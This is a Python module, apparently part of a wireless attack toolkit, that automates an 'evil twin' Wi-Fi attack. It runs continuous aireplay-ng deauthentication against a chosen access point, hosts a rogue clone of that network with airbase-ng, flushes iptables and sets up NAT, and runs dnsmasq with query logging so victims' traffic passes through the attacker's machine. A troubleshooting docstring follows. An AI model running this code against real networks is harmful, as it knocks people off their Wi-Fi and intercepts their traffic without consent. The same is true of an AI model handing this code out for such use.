import os
import time

import Network
import main
from Network import clear, ansi_escape_red, ansi_escape_green

import threading
import subprocess

terminals = ['x-terminal-emulator', 'gnome-terminal', 'konsole', 'xfce4-terminal']

def run_command(command):
    """
     This command will execute in the main terminal and display both its input and output.
     It is intended for calling commands that do not require termination

    :param command:
    :return:
    """
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print(f"Command: {command}")
    if result.returncode == 0:
        print("Output:\n" + result.stdout)
        print('\n')
        return result.stdout
    else:
        print(f"{ansi_escape_red('Error')}:\n" + result.stderr)
        print('\n')
        return result.stderr
    print("-" * 30)


def popen_command(command):
    """
    Similar to run_command(), but it returns the process, so we can terminate it if necessary. This can be used for a
    process that needs to be stopped after some time, like airodump-ng.
    """
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    return process


def popen_command_new_terminal(command):
    """
    This function is used for commands that require simultaneous execution (designed for the evil twin attack). With
    this update, child terminals are not bound to the parent terminal, allowing us to see the stderr and stdout. If
    we were to use the old logic of creating child terminals, an error would cause the child terminal to close
    immediately, causing us to lose any output that could be useful for troubleshooting.
    """
    command_success = False
    for terminal in terminals:
        try:
            # Append 'exec bash' to keep the terminal open
            terminal_command = ""
            if terminal == 'gnome-terminal':
                terminal_command = f"{terminal} -- /bin/sh -c '{command}; exec bash'"
            elif terminal == 'konsole':
                terminal_command = f"{terminal} -e /bin/sh -c '{command}; exec bash'"
            elif terminal == 'xfce4-terminal':
                terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            else:
                terminal_command = f"{terminal} -e 'bash -c \"{command}; exec bash\"'"
            print(f"Executing command: {ansi_escape_green(terminal_command)}\n")
            subprocess.Popen(terminal_command, shell=True)
            command_success = True
            break
        except Exception as e:
            print(f"Failed to execute command in {ansi_escape_green(terminal)}: {ansi_escape_red(e)} \n")
    if not command_success:
        print("Failed to execute command in a new terminal. No compatible terminal emulator found.\n")


def switch_interface_channel(interface, target_channel):
    command = f'iwconfig {interface} channel {target_channel}'
    process = popen_command(command)
    process.wait()
    print(f'{ansi_escape_green(interface)} set to channel {target_channel}')
    return


def aireplay_on_target_bssid(interface, channel, target_ap=None, target_bssid=None):
    if target_bssid and not target_ap:
        command = f'aireplay-ng --deauth 0 -a {target_bssid} {interface}'
        message_to_user = f'running aireplay on {ansi_escape_green(target_bssid)}'
    else:
        command = f'aireplay-ng --deauth 0 -e {target_ap} {interface}'
        message_to_user = f'running aireplay on {ansi_escape_green(target_ap)}'
    switch_interface_channel(interface, channel)
    popen_command_new_terminal(command)
    print(message_to_user)
    return


def airbase_host_evil_twin(interface, channel, target_ap=None, target_bssid=None):
    if target_bssid and not target_ap:
        print('Functionality for BSSID without AP not implemented yet.')
        return
    else:
        command = f'airbase-ng -e {target_ap} -c {channel} {interface}'
        command = f'airbase-ng -e {target_ap} {interface}'

        message_to_user = f'Running airbase-ng to host {ansi_escape_green(target_ap)} on a new interface'
    popen_command_new_terminal(command)
    print(message_to_user)
    return


def create_dnsmasq_conf():
    """

    :return: dnsmasq_conf_location : location of dnsmasq.conf file to be used in dnsmasq()
    """
    dnsmasq_conf_location = '/tmp/dnsmasq.conf'
    conf_file = ["interface=at0",
                 "dhcp-range=192.168.2.1,192.168.2.255,255.255.255.0,12h",
                 "dhcp-option=3,192.168.2.1",
                 "dhcp-option=6,192.168.2.1",
                 "server=8.8.8.8",
                 "server=8.8.4.4",
                 "log-queries",
                 "log-dhcp",
                 "cache-size=1000",
                 "listen-address=192.168.2.1"

                 ]
    with open(dnsmasq_conf_location, 'w') as dnsmasq_conf:
        for line in conf_file:
            dnsmasq_conf.write(line + "\n")
    print('dnsmasq.conf created at /tmp/dnsmasq.conf')
    return dnsmasq_conf_location


def dnsmasq():
    dnsmasq_conf_location = create_dnsmasq_conf()
    print(f'Running dnsmasq with the config file on {ansi_escape_green(dnsmasq_conf_location)}')
    command = f'dnsmasq -C {dnsmasq_conf_location} -d'
    popen_command_new_terminal(command)


def configure_at0(interface):
    # Bring up the at0 interface
    run_command('ifconfig at0 up')

    # Clear existing iptables rules to start fresh (consider more selective flushing for production environments)
    run_command('iptables --flush')
    run_command('iptables -t nat --flush')
    run_command('iptables -t mangle --flush')
    run_command('iptables -P FORWARD ACCEPT')

    # Set the MTU for at0 (optional, based on your needs)
    run_command('ifconfig at0 mtu 1500')

    # Configure the at0 interface with a new IP and subnet mask
    run_command('ifconfig at0 192.168.2.1 netmask 255.255.255.0')

    # Configure routing for the new subnet. This might not be necessary depending on your setup,
    # as NAT and IP forwarding are the critical parts for internet access.
    # run_command('route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1')

    # Enable NAT to allow devices connected to at0 to access the internet through your internet-facing interface
    run_command(f'iptables --table nat --append POSTROUTING --out-interface {interface} -j MASQUERADE')

    # Allow forwarding from at0 to the internet-facing interface
    run_command('iptables --append FORWARD --in-interface at0 -j ACCEPT')

    # Enable IP forwarding to allow the Linux kernel to forward packets between interfaces
    run_command('echo 1 > /proc/sys/net/ipv4/ip_forward')


def evil_twin(interface, target_ap):
    bssid, channel = Network.get_BSSID_and_Station_from_AP(interface, target_ap)
    # print(f'Changing {ansi_escape_green(interface)} to managed mode')
    # main.switch_selected_interface_to_managed_mode()
    aireplay_on_target_bssid(interface, channel, target_ap=target_ap, target_bssid=bssid)
    airbase_host_evil_twin(interface, channel, target_ap=target_ap, target_bssid=bssid)
    time.sleep(1.5)
    configure_at0(interface)
    dnsmasq()

    input('press enter to close the evil twin | cleanup network rules')
    evil_twin_cleanup(interface)
    # remove masquared rules for wlan0
def arp_spoof(interface):
    return

def bring_interface_up(interface):
    stdout = run_command(f'ip link show {interface}')
    if 'DOWN' in stdout:
        stdout2 = run_command(f'ifconfig {interface} up')
        if stdout2:
            if 'Device or resource busy' in stdout2:
                # print('honestly just unplug')
                process = popen_command('sudo systemctl stop NetworkManager')
                process.wait()
                run_command(f'ifconfig {interface} up')
                run_command('sudo systemctl start NetworkManager')

def evil_twin_cleanup(interface):
    def remove_masquerade_rules(interface):
        command = ['iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', interface, '-j', 'MASQUERADE']
        while True:
            try:
                subprocess.check_call(command)
                print(f"Removed a MASQUERADE rule for {interface}")
            except subprocess.CalledProcessError as e:
                print(f"No more MASQUERADE rules for {interface} to remove.")
                break

    remove_masquerade_rules(interface)

"""
    troubleshoot 
    
    --------------------------------------------------------------------------------------
    
        Devices connect to evil twin but no network is avaliable on the target system
        
        ====================    Check IP Forwarding     
        
        run to check ip forwarding                   $   :  sysctl net.ipv4.ip_forward      
        output should be                             out :  net.ipv4.ip_forward = 1
        if not, run                                  $   :   sudo sysctl -w net.ipv4.ip_forward=1

        ====================   Verify iptables Configuration
        script sets up NAT using iptables to masquerade traffic from the at0 interface to the 
        internet facing interface wlan0, eth0, etc. Ensure that iptables rules are applied. 
        You can list the iptables NAT table rules with:
    
        run                       $    :   sudo iptables -t nat -L -v
        output must be like       out  {
    

    
    --------------------------------------------------------------------------------------

        if you see this output  :   {
                                                Scan was not succesful due to wlan0 being DOWN
                                                AIRODUMP-NG STDOUT ::
                                                Failed initializing wireless card(s): wlan0
                                        
                                                Rerun the Scan  Y/N 
                                     }
                                                    
        then your interface is down either 
        
        run                                       $   :  sudo ifconfig <interface> up
        if you see this error after ifconfig      out :  SIOCSIFFLAGS: Device or resource busy
        do                                            :  reconnect the interface
    
        
    --------------------------------------------------------------------------------------
    
    dnsmasq:
        1. : dnsmasq: failed to bind DHCP server socket: Address already in use

            run                                        $ :   sudo lsof -i :67
            or run                                     $ :   sudo netstat -lpn | grep :67
            then kill the service running on port 67   $ :   sudo kill -9 <PID>

                            

"""